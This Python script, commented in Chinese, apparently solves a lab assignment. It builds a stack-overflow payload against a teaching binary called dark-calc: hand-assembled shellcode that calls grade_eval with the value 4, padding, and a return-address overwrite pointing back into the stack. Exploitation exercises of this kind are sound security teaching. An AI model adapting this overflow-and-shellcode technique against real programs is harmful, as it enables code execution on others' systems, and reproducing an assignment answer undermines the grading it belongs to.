#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

思路：把一小段机器码写进 expression 缓冲区，再把返回地址改成缓冲区自身的地址，
让 ret 直接跳到栈上执行。这段机器码把 grade_eval 的参数 edi 设为 4，
然后跳进 grade_eval，从而打印 "Hope A will be your grade!"。

dark-calc 通过 init_fixed_stack() 在 0x721000000000 处 mmap 了一块 RWX 内存，
并把 rsp 固定为 0x721000801000，所以 input 的栈帧地址是确定的：
  expression = 0x721000800fd0

这里用 jmp rax 而不是 call rax：在这个 shellcode 里，call 会把返回地址
0x721000800fdf 压到 0x721000800fe8，grade_eval 的 ret 随后会跳到 offset 15
的 0x00 填充上，程序立刻崩溃。改成先 push 好 main+4 再 jmp，grade_eval 的
ret 就直接回到主循环。
"""
import sys

OFFSET_RET = 24
STACK_BUF = 0x721000800FD0      # input 的 expression 地址（由 init_fixed_stack 固定）
GRADE_EVAL = 0x401A87           # void grade_eval(int grade)
MAIN_LOOP = 0x401AC7            # main+4


def p64(x):
    return x.to_bytes(8, "little")


# 15 字节机器码：
#   push 4 / pop rdi          -> edi = 4
#   push main+4               -> grade_eval 的 ret 落点
#   mov eax, grade_eval / jmp rax
shellcode = bytes([
    0x6A, 0x04,                              # push 0x4
    0x5F,                                    # pop rdi
    0x68]) + MAIN_LOOP.to_bytes(4, "little") + bytes([
    0xB8]) + GRADE_EVAL.to_bytes(4, "little") + bytes([
    0xFF, 0xE0,                              # jmp rax
])

payload = shellcode
payload += b"\x00" * (OFFSET_RET - len(payload))  # 补满 saved rbp
payload += p64(STACK_BUF)                         # 覆盖返回地址，跳回栈上

sys.stdout.buffer.write(payload)
